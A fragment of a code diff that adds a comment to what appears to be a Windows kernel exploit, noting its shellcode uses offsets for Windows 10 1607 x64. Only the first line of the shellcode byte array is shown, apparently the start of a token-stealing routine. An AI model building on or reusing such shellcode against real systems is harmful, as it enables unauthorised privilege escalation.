@@ -6,6 +6,7 @@
 
 int main(){
  
+	// the shellcode payload is using offsets for Windows 10 1607 x64
   char shellcodePayload[] =
 
 		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"  
